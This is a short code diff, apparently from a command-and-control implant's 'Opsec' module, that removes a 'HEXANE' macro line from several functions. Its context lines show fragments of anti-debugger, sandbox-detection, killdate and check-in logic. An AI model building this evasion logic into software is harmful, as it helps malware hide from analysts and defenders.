@@ -2,7 +2,6 @@
 namespace Opsec {
 
     BOOL RuntimeChecks() {
-        HEXANE
 
         bool success = true;
 #ifndef DEBUG
@@ -21,7 +20,6 @@ namespace Opsec {
     }
 
     BOOL CheckTime() {
-        HEXANE
 
         if (Ctx->config.killdate != 0) {
             if (Utils::Time::GetTimeNow() >= Ctx->config.killdate) {
@@ -39,7 +37,6 @@ namespace Opsec {
     }
 
     BOOL CheckDebugger() {
-        HEXANE
 
         PPEB peb    = PEB_POINTER;
         BOOL m_x32  = FALSE;
@@ -71,7 +68,6 @@ namespace Opsec {
 
     BOOL CheckSandbox() {
         // todo: check ACPI tables for vm vendors instead of just checking memory
-        HEXANE
 
         MEMORYSTATUSEX stats = { };
         stats.dwLength = sizeof(stats);
@@ -81,7 +77,6 @@ namespace Opsec {
     }
 
     BOOL CheckEnvironment() {
-        HEXANE
         // todo: add more information to the checkin message
 
         _stream         *out    = Stream::CreateStreamWithHeaders(TypeCheckin);
@@ -140,7 +135,6 @@ namespace Opsec {
     }
 
     BOOL ImageCheckArch(const _executable *const image) {
-        HEXANE
 
         if (image->nt_head->Signature != IMAGE_NT_SIGNATURE) {
             ntstatus = ERROR_INVALID_EXE_SIGNATURE;
@@ -155,7 +149,6 @@ namespace Opsec {
     }
 
     BOOL ImageCheckCompat(const _executable *const source, const _executable *const target) {
-        HEXANE
 
         if (target->nt_head->FileHeader.Machine != source->nt_head->FileHeader.Machine) {
             ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
